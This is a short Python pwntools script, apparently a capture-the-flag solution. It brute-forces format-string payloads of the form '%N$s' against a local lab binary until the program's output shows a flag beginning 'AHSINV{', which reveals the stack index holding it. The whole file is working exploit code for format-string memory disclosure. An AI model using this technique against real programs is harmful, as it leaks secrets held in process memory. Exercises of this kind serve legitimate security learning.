import sys
from pwn import *

stackIndex = None
count = 0

context.binary = binary = ELF("./DisassembleTheStack")

while True:
    format_s = b"".join([b"%" + str(count).encode("utf-8") + b"$s"])
    p = process()
    p.recvuntil(b"first: ")
    p.sendline(format_s)
    output = p.recvall().decode("latin-1")
    if "AHSINV{" in output:
        print(f"\n\nThe flag is on this stack index: {count}\n\n")
        sys.exit(0)
    count += 1


